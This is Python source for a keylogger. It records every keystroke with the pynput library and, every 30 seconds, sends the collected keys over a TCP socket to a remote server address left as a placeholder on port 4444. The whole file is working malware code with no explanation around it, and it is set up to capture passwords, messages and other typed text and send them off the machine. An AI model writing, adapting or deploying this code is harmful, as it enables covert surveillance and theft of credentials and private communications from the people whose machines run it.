import socket
import threading
import time
from queue import Queue
from pynput.keyboard import Key, Listener

# - SETUP -
SERVER_IP = "<SERVER_IP_ADDRESS>"
SERVER_PORT = 4444
TIME_INTERVAL = 30  # Send data every 30 seconds

# A thread-safe queue to hold keystrokes
key_queue = Queue()

def start_keylogger():

    def on_press(key):
        try:
            key_queue.put(key.char)
        except AttributeError:
            key_queue.put(f'[{key.name}]')

    def on_release(key):
        if key == Key.esc:

            key_queue.put(None)
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        print("[*] Keystroke listener started. Press 'Esc' to stop.")
        listener.join()

# --- Main Networking Loop ---

logger_thread = threading.Thread(target=start_keylogger)
logger_thread.daemon = True
logger_thread.start()

print("[*] Main networking loop started.")
while True:
    time.sleep(TIME_INTERVAL)

    # Get all keystrokes from the queue
    log_data = ""
    while not key_queue.empty():
        key = key_queue.get()
        if key is None: 
            print("[*] Stop signal received. Shutting down.")
            exit()
        log_data += str(key)

    # If there's no new data continue
    if not log_data:
        continue

    # Try to send the data
    try:
        # Create a new socket for each connection attempt
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientsocket:
            clientsocket.connect((SERVER_IP, SERVER_PORT))
            clientsocket.sendall(log_data.encode('utf-8'))
            print(f"Sent {len(log_data.encode('utf-8'))} bytes to {SERVER_IP}:{SERVER_PORT}")

    except Exception as e:
        print(f"[!] An error occurred while sending data: {e}")